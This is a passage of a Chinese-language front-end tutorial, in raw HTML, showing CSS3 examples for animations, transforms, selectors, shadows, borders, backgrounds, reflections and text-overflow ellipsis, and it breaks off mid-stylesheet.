class=\"hljs-comment\">#waves .li5 span {</span>\n      animation: waves 0.7s linear 0s infinite alternate;\n      -webkit-animation: waves 0.7s linear 0s infinite alternate;\n    }\n\n    .demo-music <span class=\"hljs-comment\">#waves .li6 span {</span>\n      animation: waves 0.8s linear 0s infinite alternate;\n      -webkit-animation: waves 0.8s linear 0s infinite alternate;\n    }\n    @-webkit-keyframes waves {\n      10% {\n        height: 20%;\n      }\n      20% {\n        height: 60%;\n      }\n      40% {\n        height: 40%;\n      }\n      50% {\n        height: 100%;\n      }\n      100% {\n        height: 50%;\n      }\n    }\n\n    @keyframes waves {\n      10% {\n        height: 20%;\n      }\n      20% {\n        height: 60%;\n      }\n      40% {\n        height: 40%;\n      }\n      50% {\n        height: 100%;\n      }\n      100% {\n        height: 50%;\n      }\n    }\n  &lt;/style&gt;\n&lt;/head&gt;\n&lt;body&gt;\n  &lt;div class=<span class=\"hljs-string\">\"demo-music\"</span>&gt;\n    &lt;div class=<span class=\"hljs-string\">\"music\"</span>&gt;\n      &lt;ul id=<span class=\"hljs-string\">\"waves\"</span> class=<span class=\"hljs-string\">\"movement\"</span>&gt;\n        &lt;li class=<span class=\"hljs-string\">\"li1\"</span>&gt;&lt;span class=<span class=\"hljs-string\">\"ani-li\"</span>&gt;&lt;/span&gt;&lt;/li&gt;\n        &lt;li class=<span class=\"hljs-string\">\"li2\"</span>&gt;&lt;span class=<span class=\"hljs-string\">\"ani-li\"</span>&gt;&lt;/span&gt;&lt;/li&gt;\n        &lt;li class=<span class=\"hljs-string\">\"li3\"</span>&gt;&lt;span class=<span class=\"hljs-string\">\"ani-li\"</span>&gt;&lt;/span&gt;&lt;/li&gt;\n        &lt;li class=<span class=\"hljs-string\">\"li4\"</span>&gt;&lt;span class=<span class=\"hljs-string\">\"ani-li\"</span>&gt;&lt;/span&gt;&lt;/li&gt;\n        &lt;li class=<span class=\"hljs-string\">\"li5\"</span>&gt;&lt;span class=<span class=\"hljs-string\">\"ani-li\"</span>&gt;&lt;/span&gt;&lt;/li&gt;\n        &lt;li class=<span class=\"hljs-string\">\"li6\"</span>&gt;&lt;span class=<span class=\"hljs-string\">\"ani-li\"</span>&gt;&lt;/span&gt;&lt;/li&gt;\n      &lt;/ul&gt;\n      &lt;div class=<span class=\"hljs-string\">\"music-state\"</span>&gt;&lt;/div&gt;\n    &lt;/div&gt;\n    &lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre><h2 data-id=\"heading-10\">4.形状转换</h2><p>这一部分，分2d转换和3d转换。有什么好玩的，下面列举几个！</p><h3 data-id=\"heading-11\">4-1.语法</h3><p>transform:适用于2D或3D转换的元素<br>transform-origin：转换元素的位置（围绕那个点进行转换）。默认(x,y,z)：(50%,50%,0)</p><h3 data-id=\"heading-12\">4-2.实例</h3><p>transform:rotate(30deg);</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf4073fe59bee?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"284\" data-height=\"218\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;284&quot; height=&quot;218&quot;&gt;&lt;/svg&gt;\"></p><p>transform:translate(30px,30px);</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40796ffdae7?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"501\" data-height=\"450\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;501&quot; height=&quot;450&quot;&gt;&lt;/svg&gt;\"></p><p>transform:scale(.8);</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40757b99cbe?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"404\" data-height=\"373\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;404&quot; height=&quot;373&quot;&gt;&lt;/svg&gt;\"></p><p>transform: skew(10deg,10deg);</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf4079d3f4d6e?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"280\" data-height=\"160\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;280&quot; height=&quot;160&quot;&gt;&lt;/svg&gt;\"></p><p>transform:rotateX(180deg);</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf4076749b7ff?imageslim\" data-width=\"142\" data-height=\"97\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;142&quot; height=&quot;97&quot;&gt;&lt;/svg&gt;\"></p><p>transform:rotateY(180deg);</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf407ce7addac?imageslim\" data-width=\"142\" data-height=\"97\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;142&quot; height=&quot;97&quot;&gt;&lt;/svg&gt;\"></p><p>transform:rotate3d(10,10,10,90deg);</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf407e0e9cca6?imageslim\" data-width=\"182\" data-height=\"114\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;182&quot; height=&quot;114&quot;&gt;&lt;/svg&gt;\"></p><h2 data-id=\"heading-13\">5.选择器</h2><p>css3提供的选择器可以让我们的开发，更加方便！这个大家都要了解。下面是css3提供的选择器。</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40815f2e26b?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"780\" data-height=\"728\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;780&quot; height=&quot;728&quot;&gt;&lt;/svg&gt;\"></p><p>图片来自w3c。这一块建议大家去w3c看（<a href=\"https://link.juejin.im?target=http%3A%2F%2Fwww.w3school.com.cn%2Fcssref%2Fcss_selectors.asp\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CSS 选择器参考手册</a>），那里的例子通俗易懂。我不重复讲了。<br>提供的选择器里面，基本都挺好用的。但是我觉得有些不会很常用，比如，<code>:root，:empty，:target，:enabled，:checked</code>。而且几个不推荐使用，网上的说法是性能较差<code>[attribute*=value]，[attribute$=value]，[attribute^=value]</code>，这个我没用过，不太清楚。</p><h2 data-id=\"heading-14\">6.阴影</h2><p>以前没有css3的时候，或者需要兼容低版本浏览器的时候，阴影只能用图片实现，但是现在不需要，css3就提供了！</p><h3 data-id=\"heading-15\">6-1.语法</h3><pre class=\"hljs bash\"><code>box-shadow: 水平阴影的位置 垂直阴影的位置 模糊距离 阴影的大小 阴影的颜色 阴影开始方向（默认是从里往外，设置inset就是从外往里）;\n</code></pre><h3 data-id=\"heading-16\">6-1.栗子</h3><pre class=\"hljs bash\"><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;meta charset=<span class=\"hljs-string\">\"utf-8\"</span>&gt; \n&lt;title&gt;&lt;/title&gt; \n&lt;style&gt; \ndiv\n{\n    width:300px;\n    height:100px;\n    background:<span class=\"hljs-comment\">#09f;</span>\n    box-shadow: 10px 10px 5px <span class=\"hljs-comment\">#888888;</span>\n}\n&lt;/style&gt;\n&lt;/head&gt;\n&lt;body&gt;\n\n&lt;div&gt;&lt;/div&gt;\n\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre><p>运行效果</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf408200fcfe3?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"364\" data-height=\"151\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;364&quot; height=&quot;151&quot;&gt;&lt;/svg&gt;\"></p><h2 data-id=\"heading-17\">7.边框</h2><h3 data-id=\"heading-18\">7-1.边框图片</h3><h4 data-id=\"heading-19\">7-1-1.语法</h4><p>border-image: 图片url 图像边界向内偏移 图像边界的宽度(默认为边框的宽度) 用于指定在边框外部绘制偏移的量（默认0） 铺满方式--重复（repeat）、拉伸（stretch）或铺满（round）（默认：拉伸（stretch））;</p><h4 data-id=\"heading-20\">7-1-2.栗子</h4><p>边框图片（来自菜鸟教程）</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf4081f22448c?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"81\" data-height=\"81\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;81&quot; height=&quot;81&quot;&gt;&lt;/svg&gt;\"></p><p>代码</p><pre class=\"hljs bash\"><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;meta charset=<span class=\"hljs-string\">\"utf-8\"</span>&gt;\n&lt;title&gt;&lt;/title&gt;\n&lt;style&gt;\n.demo {\n    border: 15px solid transparent;\n    padding: 15px;   \n    border-image: url(border.png);\n    border-image-slice: 30;\n    border-image-repeat: round;\n    border-image-outset: 0;\n}\n&lt;/style&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;div class=<span class=\"hljs-string\">\"demo\"</span>&gt;&lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre><p>效果</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf4084a24c0f6?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"601\" data-height=\"91\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;601&quot; height=&quot;91&quot;&gt;&lt;/svg&gt;\"></p><p>有趣变化</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf408714dd53c?imageslim\" data-width=\"617\" data-height=\"444\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;617&quot; height=&quot;444&quot;&gt;&lt;/svg&gt;\"></p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf408927cbdf9?imageslim\" data-width=\"617\" data-height=\"444\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;617&quot; height=&quot;444&quot;&gt;&lt;/svg&gt;\"></p><p>那个更好看，大家看着办</p><h3 data-id=\"heading-21\">7-2.边框圆角</h3><h4 data-id=\"heading-22\">7-2-1.语法</h4><pre class=\"hljs bash\"><code>border-radius: n1,n2,n3,n4;\nborder-radius: n1,n2,n3,n4/n1,n2,n3,n4;\n/*n1-n4四个值的顺序是：左上角，右上角，右下角，左下角。*/\n</code></pre><h4 data-id=\"heading-23\">7-2-2.栗子</h4><pre class=\"hljs bash\"><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;meta charset=<span class=\"hljs-string\">\"utf-8\"</span>&gt; \n&lt;title&gt;&lt;/title&gt; \n&lt;style&gt; \ndiv\n{\n    border:2px solid <span class=\"hljs-comment\">#a1a1a1;</span>\n    padding:10px 40px; \n    background:<span class=\"hljs-comment\">#dddddd;</span>\n    text-align:center;\n    width:300px;\n    border-radius:25px 0 25px 0;\n}\n&lt;/style&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;div&gt;border-radius&lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre><p>运行结果</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf408a43f9c7a?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"486\" data-height=\"82\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;486&quot; height=&quot;82&quot;&gt;&lt;/svg&gt;\"></p><h2 data-id=\"heading-24\">8.背景</h2><p>这一块主要讲css3提供背景的三个属性</p><h3 data-id=\"heading-25\">background-clip</h3><p>制定背景绘制（显示）区域</p><p>默认情况（从边框开始绘制）</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf408afc1cd8b?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"533\" data-height=\"251\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;533&quot; height=&quot;251&quot;&gt;&lt;/svg&gt;\"></p><p>从padding开始绘制（显示），不算border,，相当于把border那里的背景给裁剪掉！（background-clip: padding-box;）</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf408c7be2a4e?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"533\" data-height=\"255\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;533&quot; height=&quot;255&quot;&gt;&lt;/svg&gt;\"></p><p>只在内容区绘制（显示），不算padding和border，相当于把padding和border那里的背景给裁剪掉！（background-clip: content-box;）</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf408e0dbb625?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"537\" data-height=\"244\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;537&quot; height=&quot;244&quot;&gt;&lt;/svg&gt;\"></p><h3 data-id=\"heading-26\">background-origin</h3><p>引用菜鸟教程的说法：background-Origin属性指定background-position属性应该是相对位置</p><p>下面的div初始的html和css代码都是一样的。如下<br>html</p><pre class=\"hljs bash\"><code>&lt;div&gt;\nLorem ipsum dolor sit amet, consectetuer adipiscing elit, sed diam nonummy nibh euismod tincidunt ut laoreet dolore magna aliquam erat volutpat. Ut wisi enim ad minim veniam, quis nostrud exerci tation ullamcorper suscipit lobortis nisl ut aliquip ex ea commodo consequat.\n&lt;/div&gt;</code></pre><p>css</p><pre class=\"hljs bash\"><code>div\n{\n    border:10px dashed black;\n    padding:35px;\n    background:url(<span class=\"hljs-string\">'logo.png'</span>) no-repeat,<span class=\"hljs-comment\">#ccc;</span>\n    background-position:0px 0px;\n}\n</code></pre><p>下面看下，background-origin不同的三种情况</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/4/16021299ec4cd0f0?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"506\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;506&quot;&gt;&lt;/svg&gt;\"><br></p><h3 data-id=\"heading-27\">background-size</h3><p>这个相信很好理解，就是制定背景的大小<br>下面的div初始的html和css代码都是一样的。如下<br>html</p><pre class=\"hljs bash\"><code>&lt;div&gt;\nLorem ipsum dolor sit amet, consectetuer adipiscing elit, sed diam nonummy nibh euismod tincidunt ut laoreet dolore magna aliquam erat volutpat. Ut wisi enim ad minim veniam, quis nostrud exerci tation ullamcorper suscipit lobortis nisl ut aliquip ex ea commodo consequat.\n&lt;/div&gt;</code></pre><p>css</p><pre class=\"hljs bash\"><code>div\n{\n    border:1px dashed black;\n    padding:35px;\n    background:url(<span class=\"hljs-string\">'test.jpg'</span>) no-repeat;\n}\n</code></pre><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf4094945b61e?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"605\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;605&quot;&gt;&lt;/svg&gt;\"></p><h3 data-id=\"heading-28\">多张背景图</h3><p>这个没什么，就是在一张图片，使用多张背景图片，代码如下！<br>html</p><pre class=\"hljs bash\"><code>&lt;p&gt;两张图片的背景&lt;/p&gt;\n&lt;div&gt;\nLorem ipsum dolor sit amet, consectetuer adipiscing elit, sed diam nonummy nibh euismod tincidunt ut laoreet dolore magna aliquam erat volutpat. Ut wisi enim ad minim veniam, quis nostrud exerci tation ullamcorper suscipit lobortis nisl ut aliquip ex ea commodo consequat.\n&lt;/div&gt;</code></pre><p>css</p><pre class=\"hljs bash\"><code>div\n{\n    border:1px dashed black;\n    padding:35px;\n    background-size: contain;\n    background:url(<span class=\"hljs-string\">'test.jpg'</span>) no-repeat left,url(logo.png) no-repeat right;\n}</code></pre><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf409687dad22?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"159\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;159&quot;&gt;&lt;/svg&gt;\"></p><h2 data-id=\"heading-29\">9.反射</h2><p>这个也可以说是倒影，用起来也挺有趣的。</p><h3 data-id=\"heading-30\">9-1.语法</h3><pre class=\"hljs bash\"><code>-webkit-box-reflect:方向[ above-上 | below-下 | right-右 | left-左 ]，偏移量，遮罩图片</code></pre><h3 data-id=\"heading-31\">9-2.下倒影</h3><p>html</p><pre class=\"hljs bash\"><code>&lt;p&gt;下倒影&lt;/p&gt;\n&lt;p class=<span class=\"hljs-string\">\"reflect-bottom-p\"</span>&gt;&lt;img src=<span class=\"hljs-string\">\"test.jpg\"</span> class=<span class=\"hljs-string\">\"reflect-bottom\"</span>&gt;&lt;/p&gt;</code></pre><p>css</p><pre class=\"hljs bash\"><code>.reflect-bottom-p {\n    padding-bottom: 300px;\n}\n        \n.reflect-bottom {\n    -webkit-box-reflect: below;\n}   </code></pre><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf4095f677c17?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"518\" data-height=\"669\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;518&quot; height=&quot;669&quot;&gt;&lt;/svg&gt;\"></p><h3 data-id=\"heading-32\">9-2.右倒影（有偏移）</h3><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf4096f546feb?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"282\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;282&quot;&gt;&lt;/svg&gt;\"></p><p>html</p><pre class=\"hljs bash\"><code>&lt;p&gt;右倒影同时有偏移&lt;/p&gt;\n&lt;p&gt;&lt;img src=<span class=\"hljs-string\">\"test.jpg\"</span> class=<span class=\"hljs-string\">\"reflect-right-translate\"</span>&gt;&lt;/p&gt;</code></pre><p>css</p><pre class=\"hljs bash\"><code>.reflect-right-translate {\n    -webkit-box-reflect: right 10px;\n}</code></pre><h3 data-id=\"heading-33\">9-3.下倒影（渐变）</h3><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf4097af57a33?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"507\" data-height=\"668\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;507&quot; height=&quot;668&quot;&gt;&lt;/svg&gt;\"></p><p>html</p><pre class=\"hljs bash\"><code>&lt;p&gt;下倒影（渐变）&lt;/p&gt;\n&lt;p class=<span class=\"hljs-string\">\"reflect-bottom-p\"</span>&gt;&lt;img src=<span class=\"hljs-string\">\"test.jpg\"</span> class=<span class=\"hljs-string\">\"reflect-bottom-mask\"</span>&gt;&lt;/p&gt;\n</code></pre><p>css</p><pre class=\"hljs bash\"><code>reflect-bottom-mask {\n    -webkit-box-reflect: below 0 linear-gradient(transparent, white);\n}</code></pre><h3 data-id=\"heading-34\">9-3.下倒影（图片遮罩）</h3><p>使用的图片</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf409f492ec3e?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"200\" data-height=\"200\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;200&quot; height=&quot;200&quot;&gt;&lt;/svg&gt;\"></p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40a2b211b66?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"510\" data-height=\"672\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;510&quot; height=&quot;672&quot;&gt;&lt;/svg&gt;\"></p><p>html</p><pre class=\"hljs bash\"><code>&lt;p&gt;下倒影（png图片）&lt;/p&gt;\n&lt;p class=<span class=\"hljs-string\">\"reflect-bottom-p\"</span>&gt;&lt;img src=<span class=\"hljs-string\">\"test.jpg\"</span> class=<span class=\"hljs-string\">\"reflect-bottom-img\"</span>&gt;&lt;/p&gt;\n</code></pre><p>css</p><pre class=\"hljs bash\"><code>.reflect-bottom-img {\n    -webkit-box-reflect: below 0 url(shou.png);\n}\n</code></pre><h2 data-id=\"heading-35\">10.文字</h2><h3 data-id=\"heading-36\">换行</h3><p>语法：<code>word-break: normal|break-all|keep-all;</code><br>栗子和运行效果</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40a3835c6dc?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"511\" data-height=\"446\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;511&quot; height=&quot;446&quot;&gt;&lt;/svg&gt;\"></p><p>语法：<code>word-wrap: normal|break-word;</code><br>栗子和运行效果</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40a45d4e4ed?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"602\" data-height=\"423\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;602&quot; height=&quot;423&quot;&gt;&lt;/svg&gt;\"></p><blockquote><p>超出省略号这个，主要讲<code>text-overflow</code>这个属性，我直接讲实例的原因是<code>text-overflow</code>的三个写法，<code>clip|ellipsis|string</code>。<code>clip</code>这个方式处理不美观，不优雅。<code>string</code>只在火狐兼容。</p></blockquote><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40a4c74bd9d?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"595\" data-height=\"299\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;595&quot; height=&quot;299&quot;&gt;&lt;/svg&gt;\"></p><h3 data-id=\"heading-37\">超出省略号</h3><p>这个其实有三行代码，禁止换行，超出隐藏，超出省略号<br>html</p><pre class=\"hljs bash\"><code>&lt;div&gt;This is some long text that will not fit <span class=\"hljs-keyword\">in</span> the box&lt;/div&gt;</code></pre><p>css</p><pre class=\"hljs bash\"><code>div\n{\n    width:200px; \n    border:1px solid <span class=\"hljs-comment\">#000000;</span>\n    overflow:hidden;\n    white-space:nowrap; \n    text-overflow:ellipsis;\n}</code></pre><p>运行结果</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40a87535b71?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"292\" data-height=\"42\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;292&quot; height=&quot;42&quot;&gt;&lt;/svg&gt;\"></p><h3 data-id=\"heading-38\">多行超出省略号</h3><p>超出省略号。这个对于大家来说，不难！但是以前如果是多行超出省略号，就只能用js模拟！现在css3提供了多行省略号的方法！遗憾就是这个暂时只支持webkit浏览器！</p><p>代码如下</p><pre class=\"hljs bash\"><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;    \n&lt;head&gt;\n&lt;meta charset=<span class=\"hljs-string\">\"utf-8\"</span>&gt; \n&lt;title&gt;&lt;/title&gt; \n&lt;style&gt; \ndiv\n{\n    width:400px;\n    margin:0 auto;\n    overflow : hidden;\n    border:1px solid <span class=\"hljs-comment\">#ccc;</span>\n    text-overflow: ellipsis;\n    display: -webkit-box;\n    -webkit-line-clamp: 2;\n    -webkit-box-orient: vertical;\n}\n&lt;/style&gt;\n&lt;/head&gt;\n&lt;body&gt;\n\n&lt;div&gt;这里将会超出隐藏这里将会超出隐藏这里将会超出隐藏这里将会超出隐藏这里将会超出隐藏这里将会超出隐藏这里将会超出隐藏这里将会超出隐藏这里将会超出隐藏这里将会超出隐藏这里将会超出隐藏这里将会超出隐藏这里将会超出隐藏这里将会超出隐藏这里将会超出隐藏这里将会超出隐藏这里将会超出隐藏这里将会超出隐藏这里将会超出隐藏这里将会超出隐藏这里将会超出隐藏这里将会超出隐藏这里将会超出隐藏这里将会超出隐藏这里将会超出隐藏这里将会超出隐藏这里将会超出隐藏这里将会超出隐藏这里将会超出隐藏这里将会超出隐藏这里将会超出隐藏这里将会超出隐藏这里将会超出隐藏这里将会超出隐藏这里将会超出隐藏这里将会超出隐藏这里将会超出隐藏&lt;/div&gt;\n\n\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre><p>效果图</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40a832ee9fc?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"491\" data-height=\"74\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;491&quot; height=&quot;74&quot;&gt;&lt;/svg&gt;\"></p><p>这样发现边框贴着难看，要撑开一点，但是撑开上下边框不要使用padding!因为会出现下面这个效果。</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40abc4d7d2b?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"527\" data-height=\"102\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;527&quot; height=&quot;102&quot;&gt;&lt;/svg&gt;\"></p><p>正确姿势是这样写</p><pre class=\"hljs bash\"><code>&lt;style&gt; \ndiv\n{\n    width:400px;\n    margin:0 auto;\n    overflow : hidden;\n    border:1px solid <span class=\"hljs-comment\">#ccc;</span>\n    text-overflow: ellipsis;\n    padding:0 10px;\n    display: -webkit-box;\n    -webkit-line-clamp: 2;\n    -webkit-box-orient: vertical;\n    line-height:30px;\n    